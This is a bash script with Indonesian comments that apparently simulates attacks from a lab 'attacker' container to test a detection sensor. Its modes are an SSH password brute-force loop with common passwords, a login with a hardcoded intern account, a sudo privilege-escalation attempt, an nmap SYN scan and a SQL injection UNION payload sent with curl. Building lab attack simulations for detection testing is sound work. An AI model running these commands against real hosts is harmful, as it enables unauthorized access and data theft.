#!/bin/bash
# Simulasi serangan CLO3 dari container attacker (172.30.0.66).
# Usage: attack.sh <bruteforce|unauth|privesc|portscan|sqli|check-ssh|check-http>
WEB=172.30.0.10
SENSOR=172.30.0.20
SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=4 \
 -o PreferredAuthentications=password -o PubkeyAuthentication=no -o LogLevel=ERROR"

case "$1" in
  bruteforce)   # Skenario 1: 8 percobaan password salah untuk akun yoga
    for pw in admin 123456 qwerty letmein password welcome monkey dragon; do
      sshpass -p "$pw" ssh $SSH_OPTS yoga@$WEB exit 2>/dev/null
    done
    # Alternatif: hydra -l yoga -P wordlist.txt -t 4 ssh://$WEB
    ;;
  unauth)       # Skenario 2: login berhasil dengan akun yang tidak diizinkan (intern)
    sshpass -p Intern123 ssh $SSH_OPTS intern@$WEB 'id; hostname' ;;
  privesc)      # Skenario 5: akun intern (bukan sudoers) mencoba menjadi root
    sshpass -p Intern123 ssh $SSH_OPTS intern@$WEB 'echo Intern123 | sudo -S -p "" id' ;;
  portscan)     # Skenario 6: SYN scan 1000 port ke sensor
    nmap -sS -Pn -T4 -p 1-1000 $SENSOR ;;
  sqli)         # Bonus: web attack lewat reverse proxy sensor
    curl -s -o /dev/null -w '%{http_code}\n' "http://$SENSOR/?id=1%20UNION%20SELECT%20password%20FROM%20users" ;;
  check-ssh)    # exit 0 = port SSH web masih bisa dijangkau
    nc -z -w 3 $WEB 22 ;;
  check-http)   # exit 0 = HTTP sensor masih bisa dijangkau
    curl -s -m 4 -o /dev/null http://$SENSOR/ ;;
  *) echo "usage: $0 bruteforce|unauth|privesc|portscan|sqli|check-ssh|check-http"; exit 2 ;;
esac
